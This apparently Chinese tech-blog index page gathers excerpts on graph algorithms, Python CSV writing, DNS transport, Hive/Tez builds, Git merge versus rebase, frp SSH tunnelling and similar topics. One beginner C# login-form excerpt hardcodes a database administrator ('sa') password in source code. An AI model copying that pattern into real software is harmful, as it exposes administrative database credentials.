		最小生成树 对于一个带权连通无向图G=（V，E），生成树不同，每棵树的权（即树中所有边上的权值之和）也可能不同，设r为G的所有生成树的集合，若T为r中边的权值之和最小的那棵生成树，则T称为G的最小生成树。
最小生成树的性质： 最小生成树不是唯一的。最小生成树的边的权值之和总是唯一的最小生成树的边数为顶点数减1，即边数=n-1（n为顶点数） 下面介绍两种实现最小生成树的算法：
普里姆（Prim）算法 Prim算法的执行非常类似于寻找图的最短路径的Dijkstra算法。
基本思想： 对于图G而言，V是所有顶点的集合。现在设置两个新的集合U和T， 其中U用于存放G的最小生成树中的顶点，T存放G的最小生成树中的边。从所有u∈U,v∈(V−U)u∈U,v∈(V−U) )( V−UV−U 表示除去U的所有顶点)的边中选取权值最小的边(u, v)， 将顶点v加入集合U中，将边(u, v)加入集合T中，如此不断重复，知道U = V为止，最小生成树构造完毕，这是集合T中包含了最小生成树的所有边。 （原文链接：https://blog.csdn.net/u011221820/article/details/80476304）
算法步骤如下： 首先在顶点集合中任选其中一点作为起始点，然后寻找当前该点可以访问的所有边，找出其中权重最小的边，并且该顶点未被访问过，将该点加入到已访问顶点集合中，并且将该边加入到最小生成树中，加入后若产生回路则跳过这条边，选择下一个结点，当所有结点都加入到最小生成树中后，就找出了连通图中的最小生成树。总的来说就是不断地找权值最小并且不产生闭环的n-1。 如下图所示就是Prim算法构造最小生成树的过程：
Prim算法的时间复杂度为O(|V|^2)，不依赖与|E|，因此它适用于求解边稠密的图的最小生成树，尽管采用其他方法可以改进Prim算法的时间复杂度，但增加了实现的复杂性。
克鲁斯卡尔（Kruskal）算法 Kruskal算法是一种按权值的递增次序选择合适的边来构造最小生成树的方法。
算法思路： 假设一个图有m个顶点，n条边。首先，我们需要把m个顶点看成m个独立的树，并且把n条边按照从小到大的次序进行排列。按边的权值递增顺序依次从中选出一条边，如果该边加入后不构成回路，则继续运行，否则重新选择另一条边，直到含有n-1条边。 如下图所示就是Kruskal算法构造最小生成树的过程：
通常在Kruskal算法中，采用堆来存放边的集合，每次选择最小权值的边只需O(log|E|)的时间，又每次添加新的边的过程类似求解等价类的过程，所以可以采用并查集的数据结构来描述，从而时间复杂度为O(|E|log|E|)，因此，该算法适合边稀疏而顶点较多的图。
总结 Prim算法是以点为对象，挑选与点相连的最短边来构成最小生成树。而Kruskal算法的基本思想是以边为主导地位，始终选择当前可用（所选的边不能构成回路）的最小权植边。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ca73313df8678d1143e1aba4347e0fc/" rel="bookmark">
			python如何将字典数据写入到csv文件中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		废话不多说，直接上代码：
import csv header = ['name', 'age'] #数据列名 datas = [{'name': 'Tony', 'age': 17}, {'name': '李华', 'age': 21}] # 字典数据 # test.csv表示如果在当前目录下没有此文件的话，则创建一个csv文件 # a表示以“追加”的形式写入，如果是“w”的话，表示在写入之前会清空原文件中的数据 # newline是数据之间不加空行 # encoding='utf-8'表示编码格式为utf-8，如果不希望在excel中打开csv文件出现中文乱码的话，将其去掉不写也行。 with open('test.csv', 'a', newline='',encoding='utf-8') as f: writer = csv.DictWriter(f,fieldnames=header) # 提前预览列名，当下面代码写入数据时，会将其一一对应。 writer.writeheader() # 写入列名 writer.writerows(datas) # 写入数据 PS：如果将参数**encoding=‘utf-8’**去掉的话，那么在pycharm里面显示csv数据的时候可能会出现乱码，这样一来还得加上，因为python的默认编码格式是utf-8，而excel文件编码格式是gbk，两者不兼容，建议加上encoding='utf-8’参数。如果不想excel中的csv文件乱码的话，建议将csv文件以记事本的方式打开，另存为ANSI格式即可。如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93edf6406ad0eaade828705398d9e0e5/" rel="bookmark">
			昆仑通态TPC1071Gtx的乱七八糟自用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 屏幕为：TPC1071Gtx
查看IP地址：!SetDevice(通用TCPIP父设备0,6,“GetIPInfo(IpInfo)”) 其中的6是写死的 不要更改 否则会出问题。客户端用MODBUStcp 服务器用转发设备屏幕和多个设备通讯时 如和核心板和电脑同时通讯时，要用不同的变量，否则会出现变量的跳动问题 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4706ed0d2fa668559281b3835cb7bbfb/" rel="bookmark">
			Vivado使用系列：使用自定义BD
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在TCL终端下运行ipx::add_file_group -type elaborate_bd {} [ipx::current_core]
出现的Elaborate BD这个Group下添加bd.xit:
proc update_bd { } { ## ## Setting Current Instance ## ## 设置当前IP的句柄，以便获取当前IP的Parameter set greg_bd [::ipxit::current_inst] ## 获取当前IP的REG_NUM这个Parameter set reg_num [get_property CONFIG.REG_NUM $greg_bd] ## 向vivado发出一些信息，可有可无 send_msg INFO 0 " Create CLK_WIZ " ## 在IP顶层BD内创建clock Wizard IP，命令详情见help create_bd_cell，貌似它不支持type为module的创建 set clk_lib [create_bd_cell -type ip -vlnv xilinx.com:ip:clk_wiz "clklib"] send_msg INFO 0 " Create CONFIG CLK_WIZ " ## 往SubCore里写入SubCore的属性值 ## Syntax：set_property -dict [list CONFIG.&lt;subcore's param&gt; {&lt;value of subcore's param&gt; ] &lt;subcore's handle&gt; set_property -dict [ list \ CONFIG.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4706ed0d2fa668559281b3835cb7bbfb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d590601f9ff392facbdca0ff7c37216/" rel="bookmark">
			为什么 DNS 会使用 UDP 协议，假如使用 TCP 协议又会发生什么呢？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		公众号关注 「奇妙的 Linux 世界」
设为「星标」，每天带你提升技术视野！
今天要分析的具体问题是『为什么 DNS 使用 UDP 协议』，DNS 作为整个互联网的电话簿，它能够将可以被人理解的域名翻译成可以被机器理解的 IP 地址，使得互联网的使用者不再需要直接接触很难阅读和理解的 IP 地址。作者曾经在 详解 DNS 与 CoreDNS 的实现原理 一文中介绍过 DNS 的实现原理，这篇文章中就不会介绍 DNS 的实现原理了，感兴趣的读者可以看一下。
相信 DNS 使用 UDP 协议已经成为了软件工程师的常识，对计算机网络稍有了解的人都知道 DNS 会使用 UDP 协议传输数据，但是这一观点其实不是完全正确的，我们在这里就会详细分析『为什么 DNS 会使用 UDP 传输数据』以及『为什么 DNS 不止会使用 UDP 传输数据』两个问题，希望能够帮助各位读者理解 DNS 协议的全貌。
概述 我们将要讨论的两个问题其实并不冲突，在绝大多数情况下，DNS 都是使用 UDP 协议进行通信的，DNS 协议在设计之初也推荐我们在进行域名解析时首先使用 UDP，这确实能解决很多需求，但是不能解决全部的问题。
实际上，DNS 不仅使用了 UDP 协议，也使用了 TCP 协议，不过在具体介绍今天的问题之前，我们还是要对 DNS 协议进行简单的介绍：DNS 查询的类型不止包含 A 记录、CNAME 记录等常见查询，还包含 AXFR 类型的特殊查询，这种特殊查询主要用于 DNS 区域传输，它的作用就是在多个命名服务器之间快速迁移记录，由于查询返回的响应比较大，所以会使用 TCP 协议来传输数据包。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d590601f9ff392facbdca0ff7c37216/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8fc5290535ee708e9cf281faa1119e2/" rel="bookmark">
			pip install pyecharts报错（pyecharts安装问题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.首先我是在cmd界面输入pip install pyecharts
报出错误一串大红字
2.我换了环境在pycharm的terminal处输入pip install pyecharts
依旧 报错
Exception:
Traceback (most recent call last):
File “F:\demo\xunlian\venv\lib\site-packages\pip-19.0.3-py3.8.egg\pip_vendor\urllib3\response.py”, line 360, in _error_catcher yield
pip._vendor.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host=‘files.pythonhosted.org’, port=443): Read timed out.
3.重新输入pip --default-timeout=100 install pyecharts
成功
这个代码感觉很有用的样子哦（我也是看别人的教程的哈哈）
pip --default-timeout=100 install pyecharts
pyecharts也可以替换成别的
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbcd5722ba1ea5172f6d0785d89f699f/" rel="bookmark">
			c#学习-2-登录界面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		form1
using System; using System.Collections.Generic; using System.ComponentModel; using System.Data; using System.Data.SqlClient; using System.Drawing; using System.Linq; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace 用户登录 { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void button1_Click(object sender, EventArgs e) { string username = textBoxusernanme.Text.Trim(); //取出账号 string password = textBoxPassWord.Text.Trim(); //取出密码 string myConnString = "Data Source=.;Initial Catalog=Test;Persist Security Info=True;User ID=sa;Password=6632174"; SqlConnection sqlConnection = new SqlConnection(myConnString); //实例化连接对象 sqlConnection.Open(); string sql = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbcd5722ba1ea5172f6d0785d89f699f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab99009db789c4798a9a944f7a42320a/" rel="bookmark">
			hive3编译 on tez&#43;tez-ui配置和遇到的兼容问题与踩坑记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		框架版本号Hadoop3.1.3Hive3.1.2Tez0.10.1 需要资料包的可以关注我微信公众号(最底有二维码)，回复关键字"tez"领取
tez是一个Hive的运行引擎，性能优于MR。为什么优于MR呢？看下图。 用Hive直接编写MR程序，假设有四个有依赖关系的MR作业，
上图中，绿色是ReduceTask，云状表示写屏蔽，需要将中间结果持久化写到HDFS。
Tez可以将多个有依赖的作业转换为一个作业，这样只需写一次HDFS，且中间节点较少，从而大大提升作业的计算性能。
1、编译Tez0.10.1过程：遵循官网流程 1.下载tez的src.tar.gz源码包， 附官方下载链接 【点击链接】 下载之后上传到linux系统中，并且解压出来
新版的tez0.10.1需要在github下载，附链接 https://github.com/apache/tez 2.需要在pom.xml中更改hadoop.version属性的值，以匹配所使用的hadoop分支的版本。我这里是Apache Hadoop 3.1.3 3.还有就是guava的版本，这个插件的版本也是至关重要，希望大家提前修改，把这个问题扼杀在摇篮里，我们可以看到hadoop 3.1.3使用的guava版本是27.0-jre，而tez默认的是11.0.2，所以一定要修改，否则后期装好tez也不能用。 [later@bigdata101 lib]# cd /opt/module/hadoop-3.1.3/share/hadoop/common/lib/ [later@bigdata101 lib]# ls |grep guava guava-27.0-jre.jar listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar 4.还有就是在tez编译时，tez-ui这个模块是耗时耗力不讨好，而且没啥用，所以我们可以直接跳过 5.这一步结束后就是开始编译了首先要有编译环境是必须的，所以要安装maven，安装git，这两块参考我之前的文章https://blog.csdn.net/weixin_38586230/article/details/105725346 安装编译工具 yum -y install autoconf automake libtool cmake ncurses-devel openssl-devel lzo-devel zlib-devel gcc gcc-c++ 6.先安装protobuf（官网让安装2.5.0版本的），下载链接https://github.com/protocolbuffers/protobuf/tags 下好源码包后，解压，并且编译protobuf 2.5.0
./configure make install 7.开始编译Tez（ mvn clean package -DskipTests=true -Dmaven.javadoc.skip=true 8.编译成功后，包会在apache-tez-0.10.0-src/tez-dist/target/目录下，我们需要的是这连两个 2、为Hive配置Tez了 1.将tez安装包拷贝到集群，并解压tar包，注意解压的是minimal mkdir /opt/module/tez tar -zxvf /opt/software/tez-0.10.1-SNAPSHOT-minimal.tar.gz -C /opt/module/tez 2.上传tez依赖到HDFS 上传的是不带minimal的那个,对应的tez配置为下面，下面有tez.xml的配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ab99009db789c4798a9a944f7a42320a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a55973b36f07bb4b2ee9025b3ce4b6c2/" rel="bookmark">
			Ubuntu环境使用conda安装轻量级中文ocr开源项目chineseocr_lite，最简单的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 接使用docker的方式来创建项目所报的错误选中文件之后，界面不停的绕圈，显示不了对于图片的识别结果，并且监控界面上出现错误提示如下ImportError: libpython3.6m.so.1.0: cannot open shared object file: No such file or directory，这个问题目前无解，只好使用其余的方式来搭建Chineseocr_lite开源项目 第一步 安装Conda 安装 一共有两种方式，推荐使用从清华镜像站下载，速度快并且稳定官方地址清华镜像使用如下命令进行安装，我使用的型号为Miniconda3-latest-Linux-x86_64.sh，读者需要基于自身的操作系统/64位还是32位，选择适合自己的版本 bash Miniconda3-latest-Linux-x86_64.sh 执行上面命令之后，一路输入yes，安装过程很快就会完成
添加镜像 使用如下命令添加清华镜像源 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main 使用如下命令添加中科大镜像源 conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/main/ conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/conda-forge/ conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/msys2/ conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/bioconda/ conda config --add channels https://mirrors.ustc.edu.cn/anaconda/cloud/menpo/ 使用如下命令使镜像源生效 conda config --set show_channel_urls yes 创建环境 创建一个python3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a55973b36f07bb4b2ee9025b3ce4b6c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a1c0ad9b3a07e2addb8d39478dda394/" rel="bookmark">
			STM32F7的中文参考手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分享给大家 STM32F7的中文参考手册 链接：https://pan.baidu.com/s/1TkT2k7U2v7_r-kpksFgJew
提取码：dw2f
有需要的自取！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f01d55b6e7d85a6b46a936c79fa04d1/" rel="bookmark">
			Git中merge和rebase的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用git时，遇到需要合并的情况，一般会用merge或rebase。两者有何区别呢？
假设从master分支checkout了一个develop分支，并在上面更新了几个提交。与此同时，master分支也向前推进了。现在分支应该是这样子：
图1：合并前分支情况 现在master分支位于m3提交处，develop分支位于d2处。每个分支实际上是指针，所以图中用指针表示指向对应的位置。
现在想把两个分支合并，merge和rebase均可以。我们先来看看使用merge会发生什么：
wangjie@wangjie-PC:/tmp/gittest$ git branch * develop #位于develop分支 master wangjie@wangjie-PC:/tmp/gittest$ git merge master [develop ff6d8df] Merge branch 'master' into develop 运行merge时，git会对比两个分支最新的提交（m3和d2）以及两者的共同祖先（m2），然后进行合并、提交。所以合并后的分支情况如下：
图2：develop合并master分支后 现在branch分支位于合并后的c1处。如果此时切换到master分支，再merge develop，则master仅仅是快进(fast forward)1：
wangjie@wangjie-PC:/tmp/gittest$ git checkout master 切换到分支 'master' wangjie@wangjie-PC:/tmp/gittest$ git merge develop 更新 2d741c3..ff6d8df Fast-forward #快进 test | 3 +++ 1 file changed, 3 insertions(+) 最终的结果，branch和master均指向c1提交。
图3：master分支快进 如果不用merge，用rebase呢？假设分支还处于像图1未合并的状态：
图4：未合并状态 位于develop分支，执行git rebase master：
wangjie@wangjie-PC:/tmp/gittest$ git rebase master 首先，回退分支以便在上面重放您的工作... 应用：d1 此时会以master分支为“基底”，把develop分支相对于两者的分叉处（即m2处）的修改，提取出副本，应用到基底分支（即master）。
图5：rebase 现在切换到master并merge develop，同样的，master指针仅需快进：
wangjie@wangjie-PC:/tmp/gittest$ git merge develop 更新 2d741c3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f01d55b6e7d85a6b46a936c79fa04d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1efaef74ca7dea85b5be37472c1a06d/" rel="bookmark">
			html页面嵌套其他网站页面的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		直接上代码：html页面嵌套其他网站页面的方法 &lt;div&gt; &lt;!--第一种：使用object标签--&gt; &lt;object type="text/html" data="https://www.baidu.com" style="width:1000px; height:1000px"&gt; &lt;p&gt;backup content&lt;/p&gt; &lt;/object&gt; &lt;!--第二种：使用iframe 标签--&gt; &lt;iframe src='http://wwww.baidu.com' style="width:1000px; height:1000px"&gt;&lt;/iframe&gt; &lt;/div&gt; &lt;!--第三种：先弹出一个页面，再在这个页面使用window.location.href重定向到网页--&gt; &lt;script&gt; window.location.href='http://wwww.baidu.com'; &lt;/script&gt; #注意事项：
1.如果自己的页面是https协议，被嵌套的页面是http协议，chrome浏览会提示不安全，直接拦截，不让加载。
2.解决方法：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a721cb780abd8e4399f2c64cf65c639c/" rel="bookmark">
			win10下用frp内网穿透实现ssh远程连接linux服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		win10下用frp内网穿透实现ssh远程连接linux服务器 ftp可以利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。由于疫情原因不能回实验室，teamviewer又说检测到商业用途，连接受限，索性自己搭建小型服务器。
拟实现功能：外网通过ssh访问内网机器，内网机器操作系统为ubuntu 16.04
准备 具有公网ip的服务器 公网ip服务器可以是阿里云，也可以是自己的电脑。如果打算用自己的电脑搭建服务器得去向运营商申请公网ip，申请教程网上很多，博主家里宽带是电信的，打10000转人工服务和他申请后重启下光猫就好了（这里有个小坑，电信默认一段时间后光猫自动断线重连，我这是60小时，这会导致申请的公网ip变动，打电话申请的时候最好让他关了）。
申请到公网ip后下一步要做端口映射。
端口映射 首先得先确定家里网络拓扑结构，拿我家举例，电信的光纤连接到家里的光猫，光猫只连了一个路由器，路由器下连着家里各种上网设备。注意一下，在路由器的局域网中路由器的ip是192.168.0.1，在光猫的局域网中路由器的ip是192.168.1.2
确定好网络拓扑后先去查申请到的公网ip地址，这里方法很多，可以百度“ip”，也可以像我去光猫的设置页面看（反正之后还得在这设置端口映射），电信的光猫设置页面是192.168.1.1，登录的账号密码在光猫背面有。进去后在高级设置里找到网关设置，可以在WAN IP中看到自己的公网ip，我这个就是117开头的
接着去左边的端口映射，“虚拟服务名称”随便填一个就行，方便记忆即可，局域网ip填下一级局域网的ip，服务协议选TCP就行，内部端口和外部端口映射关系满足：117.x.x.x（我家公网IP）：外部端口=局域网IP：内部端口。
按照我家的拓扑结构，假如我想将公网IP的8888端口映射到电脑上的8888端口就需要配置两个端口映射，从光猫到路由器和从路由器到电脑。
在光猫上配置端口映射 117.x.x.x：8888 -&gt; 192.168.1.2:abcd。这里192.168.1.2路由器在光猫的局域网的IP，这个abcd是任意一个端口号；在路由器上配置端口映射192.168.0.1：abcd -&gt; 192.168.0.103:8888。这里192.168.0.1是路由器在路由器局域网内的ip地址，abcd是第一步中的那个任意端口号，192.168.0.103是我电脑在路由器局域网内的ip地址。 第一步已经完成了，第二步进路由器的设置网站上，我家的是http://tplogin.cn，应用管理里面有个虚拟服务器，在里面添加端口映射即可，这里外部端口就是第2步的abcd，内部端口就是8888，ip地址就是电脑的ip地址。由于上一张图哪里我设置的abcd就是8888，因此我这外部端口也填8888，协议类型不用选，最后保存即可。
端口映射至此结束，接下来配置frp
frp配置 知乎上有篇文章讲的很好，我参考这个短时间内就搭建好了。五分钟配置frp 内网穿透
首先去github上下载frp,frp下载，选择服务器和客户端对应的版本，像我是打算用win10做服务器，连接在内网的linux深度学习服务器，就下载了windows_amd64.zip和linux_amd64.tar.gz。
下载完成后先配置服务端(本机win10):
解压windows_amd64.zip那个文件，进去后修改配置文件 frps.ini，这个7000可以随意设置，不过最好在10000以上，我这只是为了演示，就不改了。
[common] bind_port = 7000 #frp服务端端口 复制完了后在命令行或powershell里启动即可
.\frps.exe -c .\frps.ini 接下来配置客户端，把linux_amd64.tar.gz发给linux服务器，该解压的解压，（本人linux小白解压代码都查了半天，这里附上tar.gz的解压代码）
tar -zxvf xxx.tar.gz 解压完了后修改配置文件 frpc.ini，
[common] server_addr = 117.x.x.x #frp服务端地址，可以填ip或者域名，我的公网ip是117.x.x.x server_port = 7000 #frp服务端端口，即填写服务端配置中的 bind_port [ssh1] type = tcp #连接类型，填tcp或udp local_ip = 127.0.0.1 #填127.0.0.1或内网ip都可以 local_port = 22 #需要转发到的端口，ssh端口是22 remote_port = 5000 #frp服务端的远程监听端口，即你访问服务端的remote_port就相当于访问客户端的 local_port，如果填0则会随机分配一个端口 最后启动客户端，其中，nohup命令可以让你的shell命令忽略SIGHUP信号，即可以使之脱离终端运行；“&amp;”可以让你的命令在后台运行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a721cb780abd8e4399f2c64cf65c639c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da489103d366388687c22ddeacde7392/" rel="bookmark">
			百度大脑智能创作平台全新上线：AI赋能内容创作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎关注“百度NLP”官方微信公众号，及时获取更多自然语言处理领域的技术干货！ 2019年12月30日，百度大脑智能创作平台上线全新版本，带来更多新功能，助力用户解决创作痛点，提升创作效率。
百度大脑智能创作平台发布于19年4月2日，集合了百度领先的自然语言处理和知识图谱技术，旨在成为更懂用户的智能创作助手。
百度较早开始探索智能创作技术和相关应用，积累了丰富的经验，也深刻理解了媒体创作者的痛点。针对提升创作效率的问题，百度大脑智能创作平台为用户提供了高效、易用的自动创作和辅助创作能力，自开放以来，平台已支持创作文章超过10万篇，服务用户超过8000位。
智能创作平台的新能力 新版智能创作平台借助更强大的智能创作引擎技术，实现了财经、体育、天气、娱乐等类型新闻的自动创作。此外，自动创作还适用于企业内外部数据、行业热点资讯的自动分析与报告生成。同时，平台还提供了丰富的辅助创作和多模态创作能力，满足更多场景需求。
（一）自动创作：智能模板+海量数据
“自动创作”是指机器能够自主完成创作，过程中不需要人工干预的技术。用户可通过接入数据、配置专属写作模板，快速批量地自动生成文章。为了让用户可以快速开始使用，平台还内置了天气、基金、债券、足球、篮球、各大股市大盘的数据源。
图1 自动创作能力一览
在自动创作能力方面， 新版本强化了结构化数据写作的智能字段功能。平台提供了运算变量功能，支持复杂的数据预处理；同时平台还强化了分支推导、同义表达能力，不仅支持根据不同数据确定多种表达，还支持更深的嵌套逻辑，满足多样的自动生成文章诉求。创作者通过可视化的模板编辑，可用一个模板生成多篇文章，极大地提升了高频、模板化创作的效率。
（二）辅助创作：智能纠错+发布助手
“辅助创作”是指在以人为主导的创作过程中，平台的技术能力全程提供帮助，包括创作前的素材准备、创作中的润色和审核、创作后的对外发布等。那辅助创作最近又新增了哪些明星功能呢？
图2 辅助创作能力一览
首先，在创作中的审核环节，文本纠错功能新增了涉政纠错和涉政事实性检测部分，从而可以有效检查并识别用户文章中的涉政错误，帮助用户降低政治错误发生的概率。
其次，在创作后的对外发布环节，平台新增了标题推荐、地域识别、主题短语等功能，帮助创作者快速精准发布内容。
“标题推荐”功能是指平台可以根据文章内容自荐标题，为用户提供标题拟定思路。“地域识别”是指平台可根据文章内容输出国家、省份、城市等分级地域信息。“主题短语”是指平台可根据文章内容输出反映文章主题的短语，满足榜单等限制标题长度的场景诉求。通过以上功能的加持，创作者可以更专注于内容创作本身，提高创作效率。
（三）多模态创作
在内容运营中，如何快速挖掘热点事件价值，创新内容表达，是运营者最为重视的问题。而随着视频化时代的到来，短视频相比文字更容易博得用户传播动力已成为共识。作为内容运营者，不仅要准备精美的文案，还要找素材、学剪辑、做视频，技能要求及人力成本都有所提高。
基于此，智能创作平台全新推出多模态创作功能，用户可快速实现图文到视频的创作。平台可以根据图文内容快速生成解说词和配音，同时获取内容相关的视频素材，生成自然流畅的短视频。该功能可以帮助用户低成本地大幅提升短视频生产效率，满足用户个性化视频创作需求。目前该功能已在邀测阶段，欢迎大家试用。
链接：https://ai.baidu.com/creation/main/demo?name=multiple
图3 多模态创作示意图
智能创作平台的应用案例 智能创作在传媒行业的应用发展十分迅速，百度大脑智能创作平台也已经和多家权威媒体进行了深入合作。
（一）人民日报：打造AI媒体实验室
人民日报社联合百度正式成立人工智能媒体实验室，第一期的研究方向是利用百度大脑智能创作平台，为人民日报打造一个智能化“编辑团队”，辅助媒体的新闻生产，提升编辑的生产效率。
人工智能媒体实验室将基于智能创作平台的核心能力，支持媒体工作中的关键操作性需求。在新闻创作过程中，智能创作平台对新闻素材进行自动解读和加工，理解一个新闻事件的时间、地点等新闻要素，确定需要展示的关键信息，并自动纠正不规范的内容，让新闻创作更加高效，也让用户能更加及时地获取资讯。
目前，百度大脑智能创作平台的部分技术能力已经陆续在人民号后台和人民日报客户端进行实际应用，通过提升内容生产的效率和质量，进一步放大整个新闻生产线的效能。
图4 人工智能媒体实验室方案示意图
（二）宁波日报：助力资讯服务工作智能高效
宁波晚报是宁波日报报业集团的下属媒体，是宁波市读者人数最多、覆盖面最广的报纸，2019年上线了宁波本地家庭生活资讯服务APP“甬上”。“甬上”APP的日常运维中有两大痛点，一是业务多样，稿件撰写压力大，二是审核工作效率低。
“甬上”APP在接入百度AI的相关技术后，与百度大脑语音合成和智能创作平台结合开发出了写稿机器人系统——“甬小小”，可根据气象台消息完成70篇/天的稿件产出。机器人24小时自动写稿的工作能力使气象台可及时撰写、发布讯息，在台风、暴雨等恶劣天气，及时发布预警。
此外，借助智能创作平台的内容审核技术，平台实现了对用户评论、上传文本更高效精准的审核过滤，极大提高了工作效率，减少了人力成本。
图5 甬小小的自动撰稿及播报能力
除了传统媒体行业，智能创作技术在金融咨询、舆情分析等领域也有着非常广泛的应用场景。
在金融行业，用户一方面可以使用结构化数据创作功能生成模板化的金融数据报告，另外一方面可以对各种大量的金融报道进行自动摘要，快速定位核心问题；在舆情分析领域，用户可快速将一系列复杂的舆情数据转化成可读、可理解的文本报告，让企业深刻洞察数据背后的含义，提升数据的价值。更多的平台使用场景，我们也期待您来开启。
以上介绍了百度大脑智能创作平台最新功能和应用，欢迎您前去体验！
立即使用：https://ai.baidu.com/article/main/index
您也可点击"阅读原文"，访问智能创作平台官网，了解更多智能创作能力。
百度自然语言处理（Natural Language Processing，NLP）以『理解语言，拥有智能，改变世界』为使命，研发自然语言处理核心技术，打造领先的技术平台和创新产品，服务全球用户，让复杂的世界更简单。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91278cac57327defc80f242255db54bc/" rel="bookmark">
			Java基础（5）File类与IO流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		File类与IO流 一、File类 1、概述 java.io.File类
文件和目录路径名的抽象表示形式。
java把电脑中的文件和文件夹(目录)封装为了一个File类，我们可以使用File类对文件和文件夹进行操作
可以使用File类的方法
创建一个文件/文件夹删除文件/文件夹获取文件/文件夹判断文件/文件夹是否存在对文件夹进行遍历获取文件的大小 File类是一个与系统无关的类,任何的操作系统都可以使用这个类中的方法
静态成员变量
static String PathSeparator: 与系统有关的 路径 分隔符 为了方便 被表示成一个字符串
static char PathSeparatorChar 与系统有关的 路径 分隔符
static String Separator: 与系统有关的 默认名称 分隔符 为了方便 被表示成一个字符串
static char SeparatorChar：与系统有关的 默认名称 分隔符
操作路径：（不能写死）
绝对路径：从根目录开始直到文件位置(F:\…\d.txt)
相对路径：相对于程序当前所在目录到文件位置(d.txt)
​ F:\JAVA_code：windows（反斜杠 \ ）
​ F:/JAVA_code: Linux（正斜杠 / ）
​ “F:+File.Separator+JAVA_code”
2、构造方法 1、File(String pathname)
通过将给定路径名字符串转换为抽象路径名来创建一个新File 实例。
参数：
string pathname :字符串的路径名称
路径可以是以文件结尾，也可以是以文件夹结尾
路径可以是相对路径,也可以是绝对路径
注意：
​ 路径可以是存在，也可以是不存在
​ 创建File对象，只是把字符串路径封装为File对象，不考虑路径的真假情况
2、File(String parent, String child)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91278cac57327defc80f242255db54bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81e6104a2a1699cabd107b0c8374d8e4/" rel="bookmark">
			ARM Cortex-M处理器详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ARM Cortex-M处理器家族现在有8款处理器成员。在本文中，我们会比较Cortex-M系列处理器之间的产品特性，重点讲述如何根据产品应用选择正确的Cortex-M处理器。本文中会详细的对照Cortex-M 系列处理器的指令集和高级中断处理能力，以及 SoC系统级特性，调试和追踪功能和性能的比较。
1、简介
